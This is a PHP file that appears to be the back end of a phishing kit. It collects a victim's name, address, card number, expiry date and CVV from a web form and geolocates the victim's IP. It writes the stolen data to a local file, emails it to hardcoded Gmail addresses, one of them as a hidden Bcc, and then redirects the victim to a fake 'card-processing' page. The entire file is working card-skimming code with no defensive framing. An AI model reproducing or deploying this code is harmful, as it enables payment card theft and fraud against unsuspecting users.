<?php
session_start();
error_reporting(0);
include('../sources/config.php');

    
    // To send HTML mail, the Content-type header must be set
$adddate=date("D M d, Y g:i a");
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$clientip = getenv("REMOTE_ADDR"); 
$data = json_decode(file_get_contents("http://ip-api.io/json/$clientip")); 
    
    // Compose a simple HTML email message
$message = '<html><body>';
$message .= '<div style=" border:1px solid rgba(0, 0, 0, 0.3); border-radius:6px; box-shadow:1px 3px 2px rgba(0, 0, 0, 0.6); padding:10px;">';
    $message .= '<div style="padding:9px;">';
    $message .= '<p style="color:#000066; font-size:14px; font-weight:400">Full Name: '   . $_POST['firstname']."\n" . '</p>';
    $message .= '<p style="color:#000066; font-size:14px; font-weight:400">Email: '    . $_POST['email']."\n" . ' </p>';
    $message .= '<p style="color:#000066; font-size:14px; font-weight:400">Address: '   . $_POST['address']."\n" . '</p>';
    $message .= '<p style="color:#000066; font-size:14px; font-weight:400">City:  '   . $_POST['city']."\n" . '</p>';
    $message .= '<p style="color:#000066; font-size:14px; font-weight:400">State:  '   . $_POST['state']."\n" . '</p>';
    $message .= '<p style="color:#000066; font-size:14px; font-weight:400">Country:  '    . $_POST['country']."\n" . '</p>';
    $message .= '<p style="color:#000066; font-size:14px; font-weight:400">Zip Code:  '    . $_POST['zip']."\n" . '</p>';
    $message .= '<p style="color:#000066; font-size:14px; font-weight:400">----------CARD DETAIL-----------:  '    . $_POST['']."\n" . '</p>';
    $message .= '<p style="color:#000066; font-size:14px; font-weight:400">Card Name:  '    . $_POST['cardname']."\n" . '</p>';
    $message .= '<p style="color:#000066; font-size:14px; font-weight:400">Card Number:  '    . $_POST['cardnumber']."\n" . '</p>';
    $message .= '<p style="color:#000066; font-size:14px; font-weight:400">Exp Month: '   . $_POST['expmonth']."\n" . '</p>';
    $message .= '<p style="color:#000066; font-size:14px; font-weight:400">Exp Year: '   . $_POST['expyear']."\n" . '</p>';
    $message .= '<p style="color:#000066; font-size:14px; font-weight:400">CVV: '    . $_POST['cvv']."\n" . '</p>'; 
    $message .= '<p style="color:#000066; font-size:14px; font-weight:400">COUNTRY:  ' . $data->country_name .' </p>';
    $message .= '<p style="color:#000066; font-size:14px; font-weight:400">DATE: '.$adddate.' </p>';
    $message .= '<p style="color:#000066; font-size:14px; font-weight:400">Try Amount: '   . $_POST['amt_trans']."\n" . ' </p>';
              
      $message .= '<div style="color: red; font-size:11px; font-weight:400">';       
   $message .= 'IP Address: ' . $data->ip .' <br>';
   $message .= 'Location : ' . $data->city .',  ' . $data->region_name .',  ' . $data->region_code .',  ' . $data->country_name .' <br>';
   $message .= 'Zip Code: ' . $data->zip_code .' <br>';
   $message .= 'Time Zone: ' . $data->time_zone .' <br>';
   $message .= 'Network: ' . $data->organisation .' <br>';
   $message .= 'Currency Symbol: ' . $data->currencySymbol .' <br>';
   $message .= 'Currency: ' . $data->currency .' <br>';
   $message .= 'Calling Code: ' . $data->callingCode .' <br>';
     $message .= '</div>';  
$message .= '</div>';
$message .= '</body></html>';
 

$handle = fopen("script.txt", "a");
fwrite($handle, $message);
fclose($handle);




// change your email here 
$sent ="zimbramail100@gmail.com";
$subject = 'Credit Card Transfer';
$from ="support@$domain";
// To send HTML mail, the Content-type header must be set
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headers .= 'From:Credit Card From >'.$site_name.' '. $from ."\r\n".
$headers .= "Bcc: aturosandaval@gmail.com \r\n";
        'Reply-To: '. $from ."\r\n" .
        'X-Mailer: PHP/' . phpversion();

{
mail($mesaegs,$subject,$message,$headers);
mail($sent,$subject,$message,$headers);
}


header("Location: card-processing");
?>
 